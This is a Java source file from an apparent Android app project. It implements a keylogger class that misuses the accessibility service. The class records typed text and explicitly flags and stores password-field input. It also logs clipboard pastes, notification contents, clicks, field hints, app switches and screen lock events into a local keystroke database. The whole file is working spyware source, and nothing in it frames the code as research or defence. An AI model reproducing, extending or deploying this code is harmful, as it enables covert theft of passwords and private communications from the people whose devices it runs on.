package com.fason.app.features.keylogger;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.fason.app.core.FasonAccessibilityService;
import com.fason.app.core.FasonApp;

class KeyloggerAccessibility {
    private static final String TAG = "KeyA11y";
    private static final long DEDUP_WINDOW_MS = 2000;
    private static final int MAX_TEXT_LEN = 500;
    private static final int MAX_NOTIF_LEN = 300;
    private static final int MAX_PASTE_LEN = 200;
    private static final int MAX_CLICK_LEN = 100;
    private static final int MAX_HINT_LEN = 100;
    private final KeyloggerManager manager;
    private final KeystrokeDatabase db;
    private volatile String currentPackage = "";
    private volatile String lastCapturedText = "";
    private volatile long lastCaptureTime = 0;
    private volatile String lastHint = "";
    private volatile long lastClipboardSetTime = 0;
    private volatile String cachedClipboardText = "";
    private volatile long lastClipboardCheck = 0;

    KeyloggerAccessibility(KeyloggerManager manager, KeystrokeDatabase db) {
        this.manager = manager;
        this.db = db;
    }

    void handleEvent(AccessibilityEvent event) {
        if (event == null) return;
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                handleWindowStateChange(event);
                break;
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                captureText(event);
                break;
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                handleFocusEvent(event);
                break;
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                captureNotification(event);
                break;
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                captureClick(event);
                break;
        }
    }

    void onScreenStateChanged(boolean screenOn, boolean locked) {
        String eventType = screenOn ? (locked ? "screen_lock" : "screen_unlock") : "screen_off";
        String message = screenOn
            ? (locked ? "Screen locked (PIN/pattern required)" : "Screen unlocked")
            : "Screen turned off";
        db.insert("system", message, false, eventType, System.currentTimeMillis());
        manager.onEntryAdded();
    }

    String getCurrentPackage() {
        return currentPackage;
    }

    void resetState() {
        currentPackage = "";
        lastCapturedText = "";
        lastHint = "";
        lastCaptureTime = 0;
    }

    private void updatePackageFromEvent(AccessibilityEvent event) {
        if (event == null) return;
        CharSequence pkg = event.getPackageName();
        if (pkg != null) {
            String pkgStr = pkg.toString();
            if (!pkgStr.isEmpty() && !pkgStr.equals(currentPackage)) {
                currentPackage = pkgStr;
            }
        }
    }

    private void handleWindowStateChange(AccessibilityEvent event) {
        try {
            CharSequence pkg = event.getPackageName();
            if (pkg == null) return;
            String pkgStr = pkg.toString();
            if (isSystemOrImePackage(pkgStr)) return;
            if (pkgStr.equals(currentPackage)) return;
            if (isTransientWindow(event)) return;
            String oldPackage = currentPackage;
            currentPackage = pkgStr;
            if (!oldPackage.isEmpty() && !isSystemOrImePackage(oldPackage)) {
                db.insert("system",
                    "Switched from " + getAppName(oldPackage) + " to " + getAppName(pkgStr),
                    false, "app_switch", System.currentTimeMillis());
                manager.onEntryAdded();
                lastCapturedText = "";
            }
        } catch (Exception ignored) {}
    }

    private void handleFocusEvent(AccessibilityEvent event) {
        AccessibilityNodeInfo source = null;
        try {
            source = event.getSource();
            if (source == null) return;
            boolean isEditable = false;
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                isEditable = source.isEditable();
            }
            if (!isEditable && !source.isPassword()) return;
            CharSequence hint = null;
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                hint = source.getHintText();
            }
            if (hint != null && hint.length() > 0) {
                String hintStr = hint.toString().trim();
                if (!hintStr.isEmpty() && !hintStr.equals(lastHint)) {
                    lastHint = hintStr;
                    db.insert(currentPackage, "[Field: " + truncate(hintStr, MAX_HINT_LEN) + "]",
                        source.isPassword(), "field_focus", System.currentTimeMillis());
                    manager.onEntryAdded();
                }
            }
        } catch (Exception ignored) {
        } finally {
            try { if (source != null) source.recycle(); } catch (Exception ignored) {}
        }
    }

    private void captureText(AccessibilityEvent event) {
        try {
            updatePackageFromEvent(event);
            java.util.List<CharSequence> textList = event.getText();
            if (textList == null || textList.isEmpty()) return;
            String fullText = joinTexts(textList).trim();
            if (fullText.isEmpty()) return;
            boolean isPassword = event.isPassword();
            if (!isPassword) {
                AccessibilityNodeInfo source = event.getSource();
                if (source != null) {
                    isPassword = source.isPassword();
                    try { source.recycle(); } catch (Exception ignored) {}
                }
            }
            long now = System.currentTimeMillis();
            if (isPassword) {
                if (isDuplicate(fullText, now)) return;
                db.insert(currentPackage, truncate(fullText, MAX_TEXT_LEN), true, "password", now);
                manager.onEntryAdded();
                lastCapturedText = fullText;
                lastCaptureTime = now;
                return;
            }
            if (isClipboardPaste(fullText)) {
                db.insert(currentPackage, "[Pasted: " + truncate(fullText, MAX_PASTE_LEN) + "]",
                    false, "clipboard_paste", now);
                manager.onEntryAdded();
                lastCapturedText = fullText;
                lastCaptureTime = now;
                return;
            }
            int addedCount = event.getAddedCount();
            int fromIndex = event.getFromIndex();
            if (addedCount > 0 && fromIndex >= 0 && fromIndex + addedCount <= fullText.length()) {
                String newText = fullText.substring(fromIndex, fromIndex + addedCount).trim();
                if (!newText.isEmpty()) {
                    if (isDuplicate(fullText, now)) return;
                    db.insert(currentPackage, truncate(newText, MAX_TEXT_LEN), false, "text", now);
                    manager.onEntryAdded();
                    lastCapturedText = fullText;
                    lastCaptureTime = now;
                }
                return;
            }
            if (isDuplicate(fullText, now)) return;
            db.insert(currentPackage, truncate(fullText, MAX_TEXT_LEN), false, "text", now);
            manager.onEntryAdded();
            lastCapturedText = fullText;
            lastCaptureTime = now;
        } catch (Exception e) {
            Log.w(TAG, "Capture failed", e);
        }
    }

    private void captureNotification(AccessibilityEvent event) {
        try {
            java.util.List<CharSequence> textList = event.getText();
            if (textList == null || textList.isEmpty()) return;
            String text = joinTexts(textList).trim();
            if (text.isEmpty()) return;
            CharSequence pkg = event.getPackageName();
            String pkgStr = pkg != null ? pkg.toString() : "unknown";
            if (isSystemOrImePackage(pkgStr)) return;
            db.insert(pkgStr, "[Notif: " + truncate(text, MAX_NOTIF_LEN) + "]",
                false, "notification", System.currentTimeMillis());
            manager.onEntryAdded();
        } catch (Exception ignored) {}
    }

    private void captureClick(AccessibilityEvent event) {
        AccessibilityNodeInfo source = null;
        try {
            source = event.getSource();
            if (source == null) return;
            String label = getNodeLabel(source);
            try { source.recycle(); } catch (Exception ignored) {}
            source = null;
            if (label == null || label.isEmpty()) return;
            if (label.length() == 1 && label.charAt(0) >= '0' && label.charAt(0) <= '9') return;
            db.insert(currentPackage, "[Click: " + truncate(label, MAX_CLICK_LEN) + "]",
                false, "click", System.currentTimeMillis());
            manager.onEntryAdded();
        } catch (Exception ignored) {
            try { if (source != null) source.recycle(); } catch (Exception ignored2) {}
        }
    }

    private boolean isSystemOrImePackage(String pkg) {
        if (pkg == null || pkg.isEmpty()) return true;
        if (pkg.equals("com.android.systemui")) return true;
        try {
            Context ctx = FasonApp.getContext();
            android.content.pm.PackageManager pm = ctx.getPackageManager();
            try {
                java.util.List<android.content.pm.ResolveInfo> imeServices = pm.queryIntentServices(
                    new android.content.Intent("android.view.InputMethod"), 0);
                if (imeServices != null) {
                    for (android.content.pm.ResolveInfo ri : imeServices) {
                        if (ri != null && ri.serviceInfo != null &&
                            pkg.equals(ri.serviceInfo.packageName)) {
                            return true;
                        }
                    }
                }
            } catch (Exception ignored) {}
            ApplicationInfo info = pm.getApplicationInfo(pkg, 0);
            boolean isSystem = (info.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
            boolean isUpdatedSystem = (info.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0;
            return isSystem || isUpdatedSystem;
        } catch (Exception e) {
            return false;
        }
    }

    private boolean isTransientWindow(AccessibilityEvent event) {
        AccessibilityNodeInfo source = null;
        try {
            source = event.getSource();
            if (source == null) return false;
            if (!source.isVisibleToUser()) return true;
            if (source.getChildCount() == 0 && !source.isClickable()) return true;
            return false;
        } catch (Exception ignored) {
            return false;
        } finally {
            try { if (source != null) source.recycle(); } catch (Exception ignored) {}
        }
    }

    private String getNodeLabel(AccessibilityNodeInfo node) {
        if (node == null) return null;
        CharSequence text = node.getText();
        if (text != null && text.length() > 0) return text.toString().trim();
        CharSequence desc = node.getContentDescription();
        if (desc != null && desc.length() > 0) return desc.toString().trim();
        return null;
    }

    private String joinTexts(java.util.List<CharSequence> textList) {
        if (textList == null || textList.isEmpty()) return "";
        StringBuilder sb = new StringBuilder();
        for (CharSequence cs : textList) {
            if (cs != null) sb.append(cs);
        }
        return sb.toString();
    }

    private boolean isDuplicate(String text, long now) {
        return text.equals(lastCapturedText) &&
               (now - lastCaptureTime) < DEDUP_WINDOW_MS;
    }

    private boolean isClipboardPaste(String text) {
        if (text == null || text.length() < 4) return false;
        if (System.currentTimeMillis() - lastClipboardSetTime > 5000) return false;
        if (System.currentTimeMillis() - lastClipboardCheck > 5000) {
            updateClipboardSnapshot();
            lastClipboardCheck = System.currentTimeMillis();
        }
        String clipText = cachedClipboardText;
        if (clipText == null || clipText.isEmpty()) return false;
        return text.contains(clipText.trim());
    }

    private void updateClipboardSnapshot() {
        try {
            Context ctx = FasonApp.getContext();
            android.content.ClipboardManager cm = (android.content.ClipboardManager)
                ctx.getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm == null || !cm.hasPrimaryClip()) {
                cachedClipboardText = "";
                return;
            }
            android.content.ClipData clip = cm.getPrimaryClip();
            if (clip == null || clip.getItemCount() == 0) {
                cachedClipboardText = "";
                return;
            }
            CharSequence clipText = clip.getItemAt(0).coerceToText(ctx);
            String text = clipText != null ? clipText.toString().trim() : "";
            if (!text.equals(cachedClipboardText)) {
                lastClipboardSetTime = System.currentTimeMillis();
            }
            cachedClipboardText = text;
        } catch (Exception ignored) {
            cachedClipboardText = "";
        }
    }

    private String getAppName(String pkg) {
        try {
            Context ctx = FasonApp.getContext();
            android.content.pm.PackageManager pm = ctx.getPackageManager();
            ApplicationInfo info = pm.getApplicationInfo(pkg, 0);
            CharSequence label = pm.getApplicationLabel(info);
            return label != null ? label.toString() : pkg;
        } catch (Exception e) {
            return pkg;
        }
    }

    private String truncate(String s, int max) {
        if (s == null) return "";
        if (s.length() <= max) return s;
        return s.substring(0, max) + "...";
    }
}
